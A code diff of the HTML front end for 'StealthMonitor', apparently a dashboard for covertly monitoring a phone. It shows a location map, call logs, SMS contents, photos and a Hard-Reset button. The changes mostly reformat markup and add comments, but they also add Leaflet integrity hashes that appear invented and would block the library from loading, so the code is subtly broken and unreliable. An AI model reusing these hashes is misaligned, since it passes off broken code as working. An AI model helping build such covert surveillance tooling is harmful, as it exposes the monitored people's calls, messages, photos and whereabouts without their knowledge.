@@ -5,29 +5,44 @@
   <title>StealthMonitor – Dashboard</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
 
+  <!-- Seu CSS -->
   <link rel="stylesheet" href="css/style.css" />
+
+  <!-- Leaflet CSS via CDN -->
   <link
     rel="stylesheet"
     href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+    integrity="sha256-sA+e2Xb2l+0PRXMvl3eTwe/iyQ7ONkz6b3qTmZqE0EY="
+    crossorigin=""
   />
+
   <style>
-    body,html { margin:0; padding:0; font-family:sans-serif; }
-    header { padding:1rem; background:#333; color:#fff; display:flex; justify-content:space-between; }
+    body, html { margin:0; padding:0; font-family:sans-serif; }
+    header {
+      padding:1rem; background:#333; color:#fff;
+      display:flex; justify-content:space-between; align-items:center;
+    }
     #map { height:300px; }
     section { padding:1rem; }
-    table { width:100%; border-collapse:collapse; margin-top:.5rem; }
-    th, td { border:1px solid #ccc; padding:.5rem; text-align:left; }
+    table {
+      width:100%; border-collapse:collapse; margin-top:.5rem;
+    }
+    th, td {
+      border:1px solid #ccc; padding:.5rem; text-align:left;
+    }
     th { background:#f0f0f0; }
-    #photos img { max-width:100px; margin:0.5rem; border:1px solid #ddd; }
+    #photos img {
+      max-width:100px; margin:.5rem; border:1px solid #ddd;
+    }
   </style>
 </head>
 <body>
   <header>
-    <button id="logout">Logout</button>
     <div>
-      <button id="refresh">🔄 Atualizar</button>
+      <button id="logout">Logout</button>
       <button id="hardReset">Hard-Reset</button>
     </div>
+    <button id="refresh">🔄 Atualizar</button>
   </header>
 
   <section>
@@ -38,7 +53,11 @@
   <section>
     <h2>Chamadas</h2>
     <table id="callsTable">
-      <thead><tr><th>Número</th><th>Tipo</th><th>Duração(s)</th><th>Hora</th></tr></thead>
+      <thead>
+        <tr>
+          <th>Número</th><th>Tipo</th><th>Duração(s)</th><th>Hora</th>
+        </tr>
+      </thead>
       <tbody></tbody>
     </table>
   </section>
@@ -46,33 +65,11 @@
   <section>
     <h2>SMS</h2>
     <table id="smsTable">
-      <thead><tr><th>De</th><th>Conteúdo</th><th>Hora</th></tr></thead>
-      <tbody></tbody>
-    </table>
-  </section>
-
-  <section>
-    <h2>Fotos</h2>
-    <div id="photos"></div>
-  </section>
-
-  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-  <script src="js/dashboard.js"></script>
-</body>
-</html>
-
-  <section>
-    <h2>Chamadas</h2>
-    <table id="callsTable">
-      <thead><tr><th>Número</th><th>Tipo</th><th>Duração(s)</th><th>Hora</th></tr></thead>
-      <tbody></tbody>
-    </table>
-  </section>
-
-  <section>
-    <h2>SMS</h2>
-    <table id="smsTable">
-      <thead><tr><th>De</th><th>Conteúdo</th><th>Hora</th></tr></thead>
+      <thead>
+        <tr>
+          <th>De</th><th>Conteúdo</th><th>Hora</th>
+        </tr>
+      </thead>
       <tbody></tbody>
     </table>
   </section>
@@ -82,9 +79,14 @@
     <div id="photos"></div>
   </section>
 
-  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <!-- Leaflet JS via CDN -->
+  <script
+    src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
+    integrity="sha256-o9N1j7bP+5+FfiYPMU+ag6Gpv7vGj8IJzLeC78x0zUo="
+    crossorigin="">
+  </script>
+
+  <!-- Seu script de dashboard -->
   <script src="js/dashboard.js"></script>
-</body>
-</html>
 </body>
 </html>
